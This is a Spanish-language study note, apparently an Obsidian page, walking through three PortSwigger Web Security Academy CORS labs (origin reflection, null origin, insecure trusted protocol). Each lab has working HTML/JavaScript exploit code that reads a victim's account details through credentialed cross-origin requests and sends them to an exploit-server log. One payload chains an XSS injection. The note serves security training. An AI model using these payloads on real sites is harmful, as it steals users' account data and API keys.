Es un mecanismo de seguridad que permite que recursos restringidos en una página web sean solicitados desde otro dominio fuera del dominio desde el cual se sirvió el recurso original. Este mecanismo es implementado por los navegadores para controlar qué recursos pueden ser accedidos por aplicaciones web que se ejecutan en diferentes orígenes

# Vulnerabilidad CORS con reflexión de origen básica

![[01.CORS_BASICO.png]]
![[02.CORS_BASICO.png]]
![[03.CORS_BASICO.png]]

```html
<!DOCTYPE html>

<html lang="en">

<body>

    <script>

        var request = new XMLHttpRequest();

        request.onload = reqListener;

        request.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

        request.withCredentials = true;

        request.send();

        function reqListener() {

            location='/log?key='+this.responseText;

        };

    </script>

</body>

</html>
```
![[04.CORS_BASICO.png]]
![[05.CORS_BASICO.png]]

# Vulnerabilidad CORS con origen nulo confiable

![[01.CORS-NULL.png]]
![[02.CORS-NULL.png]]

```html
<!DOCTYPE html>

<html lang="en">

<body>

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>

        var req = new XMLHttpRequest();

        req.onload = reqListener;

        req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

        req.withCredentials = true;

        req.send();

        function reqListener() {

            location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);

        };

    </script>"></iframe>

</body>

</html>
```

![[03.CORS-NULL.png]]
![[04.CORS-NULL.png]]

# Vulnerabilidad de CORS con protocolos confiables e inseguros

![[01.CORS_ProtocoloConfiable.png]]
![[02.CORS_ProtocoloConfiable.png]]


```js
<script>
    document.location="http://stock.0acc00ec031fde5082f2bf4100a9002e.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0acc00ec031fde5082f2bf4100a9002e.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a7000c703e2decf82a9be0001a000dd.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

![[03.CORS_ProtocoloConfiable.png]]
![[04.CORS_ProtocoloConfiable.png]]
![[05.CORS_ProtocoloConfiable.png]]
![[06.CORS_ProtocoloConfiable.png]]
![[07.CORS_ProtocoloConfiable.png]]
